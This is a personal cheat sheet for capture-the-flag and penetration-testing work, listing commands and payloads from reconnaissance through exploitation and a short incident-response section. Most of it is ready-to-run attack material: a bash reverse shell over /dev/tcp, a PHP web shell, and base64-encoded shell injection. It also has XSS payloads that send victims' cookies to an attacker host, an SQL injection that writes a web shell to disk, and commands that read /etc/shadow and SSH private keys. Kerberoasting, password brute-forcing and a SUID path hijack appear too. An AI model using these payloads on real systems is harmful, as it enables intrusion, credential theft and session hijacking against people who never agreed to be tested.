# docs-ctf-cheatsheet
## NMAP
```bash
nmap -sC -sV -oA nmap/initial IPADRESS
nmap -p- -T5 -sC -sV -oA nmap/second IPADRESS
nmap -p443 --script ssl-enum-ciphers IPADRESS
```
> -A : Enables OS Detection, Version Detection, Script Scanning and Traceroute all in one\
-p- : Enables scanning across all ports, not just the top 1000\
-sC : Scan with default NSE scripts. Considered useful for discovery and safe\
-sV : Attempts to determine the version of the service running on port\
-oA [dir] all output to [dir]

## REVERSE SHELL
1. setup listener on my machine:
nc -lvnp 8081
2. go to\
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\
and try them out on target machine

### simple bash reverse shell
```bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```

### simple php rce
```php
<?php
echo("Hello there!");
system($_REQUEST['cmd']);
?>
```

## ENCODING STUFF

### replace bad char
>see https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions
```bash
space : ${IFS}
```

### base 64 encoding
craft encoded rs: `echo -n "[REVERSE SHELL]" | base64 -w 0`\
inject encoded rs on target: `echo -n [ENCODED REVERSE SHELL] | base64 -d | bash`
> sometimes base64 encoding conatins + chars for spaces, if so add more spaces to remove + chars (sice they might be bad chars)\
> this also works for ther payloads (not only rs)

## INTERACTIVE SHELL
target: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, hit <kbd>CTRL</kbd> + <kbd>z</kbd>\
attacker: `stty raw -echo; fg`, hit <kbd>Enter</kbd>, <kbd>Enter</kbd>
### optional
target: `export TERM=xterm`\
attacker: `stty -a` shows rows `r` and collumns `c`\
target: `stty rows r cols c`
## NETCAT
### send data

reciever:
```bash
nc -l -p 1234 > FILE.NAME
```
(sometimes netcat instead of nc!)


sender:
```bash
nc -w 3 DESTINATION 1234 < FILE.NAME
```

## TRANSFER DATA/FILES
### send data via HTTP Server
sender:
```bash
python -m SimpleHTTPServer 8083
python3 -m http.server 8083
```
reciever:
```bash
curl IPADRESSSENDER:8083/FILE.NAME
curl 10.10.IP.IP:8083/linpeas.sh > lp.sh
wget IPADRESSSENDER:8083/FILE.NAME
```
if curl is not installed, make your own!
```bash
$ function __curl() {
read proto server path <<<$(echo ${1//// })
DOC=/${path// //}
HOST=${server//:*}
PORT=${server//*:}
[[ x"${HOST}" == x"${PORT}" ]] && PORT=80
exec 3<>/dev/tcp/${HOST}/$PORT
echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
(while read line; do
 [[ "$line" == $'\r' ]] && break
done && cat) <&3
exec 3>&-
}
```
### send data via SMB Server (windows)
reciever:
```bash
python smbserver.py -smb2support -username guest -password guest share [TargetPath]
```
sender:
```powershell
net use x: \\[RecieverIP]\share /user:guest guest
cmd /c "copy [FileName] X:\"
```


### send data via Base64 Encoding
on attacker: `base64 -w 0 [FileName]`
on target: `echo "[Base64EncodedFile]" | base64 -d > [FileName]` 


## MSF
search: `search [SEARCHTERM]`\
send data: `upload /path/to/file`\
run exploit in background and enter the session: `run -j`\
sessions: `sessions -i [session id]`\
get "normal" shell: `shell`\
move out of a session: <kbd>CTRL</kbd> + <kbd>z</kbd>

## CHECK IF SOMETHING IS EXECUTED
attacker: `sudo tcpdump -i tun0 icmp`
target: `ping [local tun0 ip] -c 1`

## XML EXTERNAL ENTITY (XXE)
try :
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
```xml
<!DOCTYPE replace [<!ENTITY name "success"> ]>
 <userInfo>
  <firstName>xxe</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```
## CROSS SITE SCRIPTING (XSS)
* DOM Based
> JavaScript execution happens directly in browser without any new pages being loaded or data submitted to backend code.
* Reflected
> When user-supplied data in an HTTP request is included in the webpage source without any validation. (Cookie Stealing!)
* Stored
> XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page. (e.g. XSS in Forum Post)
* Blind
> Simmilar to stored, just payload is not seen working. (e.g. contact form)

### XSS PAYLOADS
```html
<img src=xxx onerror="console.log('XSS')">
<script>alert(“Hello World”)</script>
document.write
<img src=x onerror=alert(2)>
<script>fetch('/settings?new_password=pass123');</script>
```
* XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html)
* Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner

### COOKIE STEALING WITH XSS
> to steal a cookie a location to recieve the results is required, local ip or hookbin.com works well
```html
<script>var i=new Image;i.src="http://[IP OR DOMAIN : PORT]/?"+document.cookie;</script>
<script>document.location='http://[IP OR DOMAIN : PORT]/?'+document.cookie;</script>
<script>document.location=http://[IP OR DOMAIN : PORT]/?+document.cookie;</script>
```

## LOCAL FILE INCLUSION (LFI)
```php
include
require
include_once 
require_once
```
> these PHP functions might lead to LFI. It is possible to read files without executing them (like PHP likes to do) or send data like so:
```url
http://domain/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
http://domain/page.php?file=data://text/plain;base64,QW9DMyBpcyBmdW4hCg==
```
> Use LFI to gather information about the system and processes
```
/proc/self/stat - get pid, parent pid
/proc/self/cmdline - get commandline of current process
/proc/self/environ - get environment variables
/proc/self/exe - get binary
/etc/nginx/sites-enabled/default - find other web servers on the system
etc/apache2/sites-available/000-default.conf - apache2
```
> retrieve all information about all processes:
```bash
for i in $(seq 0 1000); do curl http://[URL]?page=../../../../proc/${i}/cmdline --output - > ${i}; done
```

## FILE UPLOAD
> Try to avoid file extensions restrictions ( see [hacktricks](https://book.hacktricks.xyz/pentesting-web/file-upload#bypass-file-extensions-checks)  ).
> Try placing following files to avoid restrictions
```
.htaccess       # apache
web.config      # IIS, can execute code
```

## LOG POISONING
```http
GET / HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: <?php system('ls /');?>
```
> sending this request can write <?php system('ls /');?> to the log file (e.g. at var/log/nginx/access.log), when accessing the log file via LFI, this can lead to XSS execution


## COMMAND INJECTION PAYLOADS
### Linux
```bash
whoami
id
ifconfig
ip addr
uname -a
ps -ef
cat /etc/passwd
cat /etc/shadow
cat /home/USERNAME/.ssh/id_rsa
```
### Windows
``` shell
whoami
ver
ipconfig
tasklist
netstat -an
```

## ACTIVE DIRECTORY AD
### BLOODHOUND
> Always download Newest Version of BloodHound.py and Bloodhound
```bash
python3 bloodhound.py -u [USER] -p [PASSWORD] -d [DOMAIN] -ns [NAMESERVER IP] -c All
sudo neoj4 console
./BloodHound
```
> afterwards import Data collected by BloodHound.py

### Kerberoast
> find kerberostable accounts with bloodhound
```
sudo ntpdate [IP TARGET]
impacket-GetUserSPNs [DOMAIN]/[USER]:[PASSWORD] -outputfile kerbroast.hashes
```

## POST EXPLOITATION WINDOWS
```powershell
Get-WmiObject -Class win32_OperatingSystem (Power Shell)
run post/windows/gather/checkvm (Metasploit) - check if vm
run post/multi/recon/local_exploit_suggester (Metasploit)
run post/windows/manage/enable_rdp (Metasploit)
ipconfig
try migrate spoolsv.exe
getuid
sysinfo
getprivs
run autoroute -s [SUBNET IP] -n 255.255.255.0
```

## DUMP PROCESSES WINDOWS
```powershell
get-process
get-process -name [ProcessName]
.\procdump.exe -ma [ProcessID] [OutputFileName]
```

## LIST SUDO COMMANDS
```bash
sudo -l
```

## Enummeration Scripts
### Local
* LinEnum
* LinPEAS
* WinPEAS
* pspys - lists running processes, good for figguering out what an app does
* deepce - docker enummeration/container escape
### Remote
* enum4linux [OPTIONS] [IP] - works for windows and linux SMB SAMBA

## SUID
find SUID : `find / -perm -u=s -type f 2>/dev/null`\
Exploit /usr/bin/menu with SUID :
```bash
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

## ADD DOMAIN
```bash
sudo nano /etc/hosts
```
> add [IPADRESS] [DOMAIN], save and it should work!

## SSH:
```bash
ssh-keygen -f [NAME]
```
>now i can write the [NAME].pub file content (except for the last part with my USER@IP) and add “ssh-rsa “ before the key if not there) to the /home/[USER]/.ssh/authorized_keys/, then
```bash
chmod 700 [NAME]
ssh -i [NAME] [USER]@[IP]
```

### PORT TUNNELING / PORT FORWARDING
how to tunnel a port when connected via ssh:\
make sure empty line first: <kbd>Enter</kbd> <kbd>Enter</kbd>\
enter: `~C` + <kbd>Enter</kbd>\ `-L [PORT ON LOCAL MACHINE]:127.0.0.1:[PORT ON REMOTE MACHINE]`
> now traffic on local machine [PORT ON LOCAL MACHINE] gets forwarded (and back) to [PORT ON REMOTE MACHINE]

## PYTHON VIRTUAL ENVIRONMENT
env init: `python3 -m venv [NAME UMGEBUNG]`\
env load: `source [NAME UMGEBUNG]/bin/activate`\
packet install (in env): `pip3 install [PACKET NAME]`\
env exit: `deactivate`\
show installed packets: `pip3 freeze`

## JAVA-VERSION ARCH LINUX
some programs run only with a certain jre, so you can use the following to set the default jre on your system:
```bash
sudo archlinux-java set java-8-openjdk/jre
```

## TMUX
start new session: `tmux new -s [NAME]`
new panel: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>c</kbd>\
rename panel: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>,</kbd>\
split panel vertical: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>%</kbd>\
split panel horizontal: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>“</kbd>\
navigate between panel: <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>arrowkey</kbd>\
resize panel: hold <kbd>CTRL</kbd> <kbd>B</kbd> + <kbd>arrowkey</kbd>

## GOBUSTER
```bash
gobuster dir -u http://ADRESS/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
maybe mit +x .php, .txt
```

## GIT
```bash
git log
git show [COMMIT-ID]
```

## SQLi (MANUAL)
### Finding An Injection Point
```
foo'
foo' --
foo' -- -
foo' OR 1=1--
foo' OR 'a' = 'a
```
> look for error messages or unexpected responses

### Union Select
> when finding an injection point figure out the expected number of columns, you know the correct number when the query gets executed successfully
```
foo' union select 1-- -
foo' union select 1,2-- -
foo' union select 1,2,3-- -
...
```
> with the correct number of columns, try getting a reverseshell
```
foo' union select "<?php SYSTEM($_REQUEST['cmd']) ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```

## MYSQL
```bash
mysql -u [USER] -p'[PASSWORD]'
mysql -u [USER] -p'[PASSWORD]' -h [HOST/IP]
```

## SQLMAP
```bash
sqlmap -r [FULLFILEPATHTOREQUEST] -p [PARAM IN REQ BODY] --proxy="http://127.0.0.1:8080"
sqlmap -u [URL]/?[PARAMNAME]=param1
```
> --dbs : dump database names\
--proxy="http://127.0.0.1:8080"\
-D [DB] : choose Target Database\
-T [TABLE] : choose Target Table\
-dump : dump target table\
--dbms=[DBTYPE] : choose DBType (mysql)

## MONGODB cli
```bash
mongo "mongodb://user:pass@localhost:27017/myplace"
db # list databases
use <db>
show collections
db.<collection name>.find() # lists all entries for one collection
db.tasks.insertOne({<name>: <content>})
```

## HYDRA
```bash
export HYDRA_PROXY_HTTP=http://127.0.0.1:8080 # set a proxy
hydra -l "Administrator" -P /opt/SecLists/Passwords/Leaked-Databases/rockyou-20.txt [DOMAIN]  http-post-form "/:username=^USER^&password=^PASS^:Your Login Name or Password is invalid" -V -I
```

## HASHCAT (Windows)
```shell
.\hashcat.exe -a [ATTACKTYPE] -m [HASHTYPE] [PATHTOHASHES] [PATHTODICTIONARY] -r [PATHTORULE]
```
>ATTACKTYPE : 0 for dictionary/dictionary-rule attack\
HASHTYPE : tunnelsup.com/hash-analyzer/, hashcat.net/wiki/doku.php?id=example_hashes\
PATHTORULE : \rules\best64.rule is good

## SMB
```bash
smbclient //[IP]/[SHARE] -U [USERNAME]
```

### Enummerate SMB with CRACKMAPEXEC CME
```bash
crackmapexec smb -u [UsernameFile or Username] -p [PasswordFile or Password] --shares
crackmapexec smb -u 'nonexistantuser' -p '' --shares
```

### Enummerate SMB Share Path
> Use this to find the location for Shares with write access to execute uploaded files via LFI
```bash
nmap --script smb-enum-shares.nse [IP]
```

### Mount Windows SMB SHARE to Linux Client (with cifs)
```bash
sudo mkdir /mnt/[NAME]
sudo mount -t cifs //[IP]/[SHARE] /mnt/[NAME]
sudo mount -t cifs -o 'username=[USERNAME],password=[PASSWORD]' //[IP]/[SHARE] /mnt/[NAME]
sudo umount /mnt/[NAME] (to unmount)
```

## NFS
```bash
sudo mount -t nfs [IP]:[tragetdirectory] /tmp/mount/ -nolock
```

## Common Applications

### Joomla
```
/administrator -> admin login
/administrator/manifests/files/joomla.xml -> contains version
```
> when beeing able to access admin panel, rce is pretty straight forward (edit template with php reverse shell)

### Apache Tomcat
```
/manager -> login, usualy only allowed from localhost (try default creds in seclists), check if proxy (like AJP) is running
/manager/text/deploy -> allows upload of .war applications (with creds, possible reverse shell with msfvenom)
```
```
/usr/share/tomcat[VERSION]/etc/tomcat-users.xml -> file contains tomcat credentials (other locations possible too)
```
## Incident Response
```
w - show who is logged on and what they are doing
```
```
ps -eaf --forest
ls -la /proc/[PROCID] | grep cwd - show current working directory of spawned shell
kill -9 [PROCID] - kill process
tcpdump -i [INTERFACE] -s 0 -w tcpdump.cap -n "port not 22" - capture how attackers try to get a shell (wireshark tcpdump.cap)
```
```
ss -anp | grep [PROCID] - see ip and port of reverse shell
ss -lntp - list all open ports
```
```
grep [PART OF IP] /var/log/apache2/access.log
```
after patching apache:
```
service apache2 restart
```

## Vim magic
```bash
:%s/stuffiwanttoremove,\(.*\),stufftoremove/\1/g     # \(.*\) will be matched to \1
```
